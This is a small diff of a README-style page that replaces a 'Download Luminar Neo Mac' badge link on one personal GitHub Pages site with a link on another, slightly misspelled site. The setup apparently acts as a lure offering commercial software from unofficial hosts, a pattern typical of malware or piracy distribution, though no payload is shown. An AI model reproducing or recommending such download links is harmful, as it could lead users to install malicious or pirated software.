@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://nikolanfu.github.io/.github/luminarneomac">  
+<a href="https://mitrobandus.github.io/.github/liminarneomac">  
 <img src="https://img.shields.io/badge/Download_Luminar_Neo_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download Luminar Neo Mac">  
 </a>  
 </div>  
